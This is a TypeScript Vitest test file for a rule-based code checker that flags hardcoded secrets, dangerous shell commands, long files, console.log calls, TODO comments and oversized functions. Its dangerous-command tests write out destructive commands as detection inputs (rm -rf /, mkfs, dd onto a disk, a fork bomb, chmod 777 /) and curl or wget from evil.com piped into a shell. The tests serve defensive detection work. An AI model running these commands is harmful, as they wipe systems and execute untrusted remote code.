import { describe, it, expect } from 'vitest';
import { runRules, RULES, type SupervisorContext } from './supervisor-rules.js';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
function makeLines(count: number): string {
  return Array.from({ length: count }, (_, i) => `// line ${i + 1}`).join('\n');
}

function makeFuncLines(bodyLineCount: number, name = 'bigFunc'): string {
  const body = Array.from({ length: bodyLineCount }, (_, i) => `  const v${i} = ${i};`).join('\n');
  return `export function ${name}() {\n${body}\n}`;
}

function violationsFor(content: string, context: SupervisorContext = {}) {
  return runRules(content, context);
}

function violationIds(content: string, context: SupervisorContext = {}): string[] {
  return violationsFor(content, context).map(v => v.ruleId);
}

// ---------------------------------------------------------------------------
// RULES metadata
// ---------------------------------------------------------------------------
describe('RULES', () => {
  it('should have 6 rules', () => {
    expect(RULES).toHaveLength(6);
  });

  it('each rule should have id, name, severity, check', () => {
    for (const rule of RULES) {
      expect(rule).toHaveProperty('id');
      expect(rule).toHaveProperty('name');
      expect(rule).toHaveProperty('severity');
      expect(rule).toHaveProperty('check');
      expect(typeof rule.check).toBe('function');
    }
  });
});

// ---------------------------------------------------------------------------
// runRules
// ---------------------------------------------------------------------------
describe('runRules', () => {
  it('returns empty array for empty content', () => {
    expect(runRules('')).toEqual([]);
  });

  // =========================================================================
  // no-hardcoded-secrets
  // =========================================================================
  describe('no-hardcoded-secrets', () => {
    it('detects sk- prefixed API key', () => {
      const ids = violationIds('const key = "sk-abc123def456ghi789jkl";');
      expect(ids).toContain('no-hardcoded-secrets');
    });

    it('detects api_key assignment', () => {
      const ids = violationIds('api_key="secret12345678901234"');
      expect(ids).toContain('no-hardcoded-secrets');
    });

    it('detects password assignment', () => {
      const ids = violationIds('password="mypass"');
      expect(ids).toContain('no-hardcoded-secrets');
    });

    it('detects AWS access key', () => {
      const ids = violationIds('AKIAIOSFODNN7EXAMPLE');
      expect(ids).toContain('no-hardcoded-secrets');
    });

    it('detects private key block', () => {
      const content = '-----BEGIN RSA PRIVATE KEY-----\nMIIEowI...';
      expect(violationIds(content)).toContain('no-hardcoded-secrets');
    });

    it('detects BEGIN PRIVATE KEY block', () => {
      const content = '-----BEGIN PRIVATE KEY-----\nMIIEowI...';
      expect(violationIds(content)).toContain('no-hardcoded-secrets');
    });

    it('does not trigger on normal comments', () => {
      const content = '// This is a normal comment about API design\nconst x = 1;';
      expect(violationIds(content)).not.toContain('no-hardcoded-secrets');
    });
  });

  // =========================================================================
  // no-dangerous-commands
  // =========================================================================
  describe('no-dangerous-commands', () => {
    it('detects rm -rf /', () => {
      expect(violationIds('rm -rf /')).toContain('no-dangerous-commands');
    });

    it('detects rm -fr /', () => {
      expect(violationIds('rm -fr /')).toContain('no-dangerous-commands');
    });

    it('detects mkfs', () => {
      expect(violationIds('mkfs.ext4 /dev/sda1')).toContain('no-dangerous-commands');
    });

    it('detects dd if=', () => {
      expect(violationIds('dd if=/dev/zero of=/dev/sda')).toContain('no-dangerous-commands');
    });

    it('detects fork bomb', () => {
      expect(violationIds(':(){ :|:&};:')).toContain('no-dangerous-commands');
    });

    it('detects curl piped to sh', () => {
      expect(violationIds('curl https://evil.com/script.sh | sh')).toContain('no-dangerous-commands');
    });

    it('detects wget piped to bash', () => {
      expect(violationIds('wget https://evil.com/script.sh | bash')).toContain('no-dangerous-commands');
    });

    it('detects chmod -R 777 /', () => {
      expect(violationIds('chmod -R 777 /')).toContain('no-dangerous-commands');
    });

    it('does not trigger on rm file.txt', () => {
      expect(violationIds('rm file.txt')).not.toContain('no-dangerous-commands');
    });

    it('does not trigger on rm -rf node_modules', () => {
      expect(violationIds('rm -rf node_modules')).not.toContain('no-dangerous-commands');
    });
  });

  // =========================================================================
  // max-file-length
  // =========================================================================
  describe('max-file-length', () => {
    it('triggers when file exceeds 500 lines', () => {
      const content = makeLines(501);
      expect(violationIds(content)).toContain('max-file-length');
    });

    it('does not trigger at exactly 500 lines', () => {
      const content = makeLines(500);
      expect(violationIds(content)).not.toContain('max-file-length');
    });

    it('does not trigger for short files', () => {
      const content = makeLines(50);
      expect(violationIds(content)).not.toContain('max-file-length');
    });
  });

  // =========================================================================
  // no-console-in-prod
  // =========================================================================
  describe('no-console-in-prod', () => {
    it('triggers on console.log in .ts file', () => {
      const ids = violationIds('console.log("hello");', { filePath: 'src/app.ts' });
      expect(ids).toContain('no-console-in-prod');
    });

    it('triggers on console.log in .tsx file', () => {
      const ids = violationIds('console.log("hi");', { filePath: 'App.tsx' });
      expect(ids).toContain('no-console-in-prod');
    });

    it('triggers on console.log in .js file', () => {
      const ids = violationIds('console.log("hi");', { filePath: 'index.js' });
      expect(ids).toContain('no-console-in-prod');
    });

    it('triggers on console.log in .jsx file', () => {
      const ids = violationIds('console.log("hi");', { filePath: 'App.jsx' });
      expect(ids).toContain('no-console-in-prod');
    });

    it('does not trigger on console.error', () => {
      const ids = violationIds('console.error("oops");', { filePath: 'app.ts' });
      expect(ids).not.toContain('no-console-in-prod');
    });

    it('does not trigger on console.warn', () => {
      const ids = violationIds('console.warn("warning");', { filePath: 'app.ts' });
      expect(ids).not.toContain('no-console-in-prod');
    });

    it('does not trigger on console.debug', () => {
      const ids = violationIds('console.debug("debug");', { filePath: 'app.ts' });
      expect(ids).not.toContain('no-console-in-prod');
    });

    it('does not trigger for non-JS files', () => {
      const ids = violationIds('console.log("hello");', { filePath: 'README.md' });
      expect(ids).not.toContain('no-console-in-prod');
    });

    it('does not trigger when no filePath in context', () => {
      const ids = violationIds('console.log("hello");');
      expect(ids).not.toContain('no-console-in-prod');
    });
  });

  // =========================================================================
  // no-todo-fixme
  // =========================================================================
  describe('no-todo-fixme', () => {
    it('detects // TODO:', () => {
      expect(violationIds('// TODO: fix this')).toContain('no-todo-fixme');
    });

    it('detects // FIXME:', () => {
      expect(violationIds('// FIXME: broken')).toContain('no-todo-fixme');
    });

    it('detects // HACK:', () => {
      expect(violationIds('// HACK: workaround')).toContain('no-todo-fixme');
    });

    it('detects // XXX:', () => {
      expect(violationIds('// XXX: bad code')).toContain('no-todo-fixme');
    });

    it('detects /* TODO */ block comment', () => {
      expect(violationIds('/* TODO: refactor this */')).toContain('no-todo-fixme');
    });

    it('detects # FIXME in shell/Python comment', () => {
      expect(violationIds('# FIXME: not working')).toContain('no-todo-fixme');
    });

    it('detects <!-- TODO --> in HTML', () => {
      expect(violationIds('<!-- TODO: add styles -->')).toContain('no-todo-fixme');
    });

    it('does not trigger on normal comments', () => {
      const content = '// This function handles user authentication\nconst x = 1;';
      expect(violationIds(content)).not.toContain('no-todo-fixme');
    });
  });

  // =========================================================================
  // no-large-function
  // =========================================================================
  describe('no-large-function', () => {
    it('triggers for function exceeding 100 lines', () => {
      const content = makeFuncLines(110, 'hugeFunc');
      const ids = violationIds(content);
      expect(ids).toContain('no-large-function');
    });

    it('does not trigger for short function', () => {
      const content = makeFuncLines(20, 'smallFunc');
      expect(violationIds(content)).not.toContain('no-large-function');
    });

    it('includes function name in violation message', () => {
      const content = makeFuncLines(120, 'myBigFunc');
      const violations = violationsFor(content);
      const fnViolation = violations.find(v => v.ruleId === 'no-large-function');
      expect(fnViolation).toBeDefined();
      expect(fnViolation!.message).toContain('myBigFunc');
    });
  });
});
